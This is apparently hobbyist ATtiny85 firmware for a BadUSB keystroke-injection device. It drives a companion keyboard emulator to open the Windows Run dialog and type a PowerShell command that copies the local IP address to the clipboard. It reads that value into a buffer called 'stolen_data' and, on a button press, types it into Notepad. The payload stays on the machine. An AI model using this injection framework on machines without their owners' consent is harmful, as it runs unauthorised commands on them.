/*******************************************************
Project : Debugged BadUSB Final
Chip    : ATtiny85
Clock   : 8.000000 MHz
*******************************************************/

#include <tiny85.h>
#include <delay.h>

#define TX_PIN PORTB.0
#define TX_DDR DDRB.0
#define RX_PIN PINB.1
#define RX_DDR DDRB.1
#define BTN_PIN PINB.4
#define BTN_DDR DDRB.4
#define BTN_PORT PORTB.4

#define BIT_DELAY_US 208    
#define HALF_BIT_DELAY_US 104 

char stolen_data[35]; 

void uart_tx(char data) {
    unsigned char i;
    TX_PIN = 0; delay_us(BIT_DELAY_US);
    for (i = 0; i < 8; i++) {
        if (data & 1) TX_PIN = 1; else TX_PIN = 0;
        data >>= 1; delay_us(BIT_DELAY_US);
    }
    TX_PIN = 1; delay_us(BIT_DELAY_US);
}

void uart_print_flash(flash char *str) {
    while (*str) uart_tx(*str++);
}

void uart_print_ram(char *str) {
    while (*str) uart_tx(*str++);
}

char uart_rx(void) {
    unsigned char i;
    char data = 0;
    while (RX_PIN == 1); 
    delay_us(HALF_BIT_DELAY_US);
    if (RX_PIN == 1) return 0;
    delay_us(BIT_DELAY_US);
    for (i = 0; i < 8; i++) {
        data >>= 1;
        if (RX_PIN == 1) data |= 0x80;
        delay_us(BIT_DELAY_US);
    }
    delay_us(BIT_DELAY_US);
    return data;
}

flash char CMD_RUN[] = "CMD:RUN\n";
flash char KEY_ENTER[] = "KEY:ENTER\n";

void main(void) {
    int i;
    

    TX_DDR = 1; TX_PIN = 1;
    RX_DDR = 0; 
    BTN_DDR = 0; BTN_PORT = 1; 

    delay_ms(500);

  
    uart_print_flash("DEBUG: *** BOOTING UP ***\n");

    
    uart_print_flash("DEBUG:Phase 1 - Getting IP\n");
    
    uart_print_flash(CMD_RUN);
    delay_ms(500);
   
    uart_print_flash("TYPE:powershell \"Set-Clipboard -Value (Get-NetIPAddress -AddressFamily IPv4).IPAddress[0]\"\n");
    delay_ms(500);
    uart_print_flash(KEY_ENTER);
    
    delay_ms(3000); 

    uart_print_flash("ACTION:GET_CLIP\n");

    
    for(i=0; i<35; i++) stolen_data[i] = 0;

    
    for(i=0; i<30; i++) {
        char c = uart_rx();
        if(c == '\n' || c == '\r') {
            stolen_data[i] = 0;
            break;
        }
        stolen_data[i] = c;
    }
    
    uart_print_flash("DEBUG: IP Saved. Entering Phase 2 (Loop).\n");

    
    while (1) {
        
        if (BTN_PIN == 0) {
            delay_ms(50); 
            if (BTN_PIN == 0) {
               
                uart_print_flash("DEBUG:Button Pressed!\n");
                
             
                uart_print_flash(CMD_RUN);
                delay_ms(500);
                uart_print_flash("TYPE:notepad\n");
                delay_ms(100);
                uart_print_flash(KEY_ENTER);
                
                delay_ms(1000); 
                uart_print_flash("TYPE:Your IP is: ");
                uart_print_ram(stolen_data);
                uart_print_flash("\n");
                
                uart_print_flash("DEBUG:Done Typing. Release Button.\n");

            
                while(BTN_PIN == 0) {
                    delay_ms(10);
                }
                
                uart_print_flash("DEBUG:Button Released. Waiting...\n");
                delay_ms(500);
            }
        }
    }
}
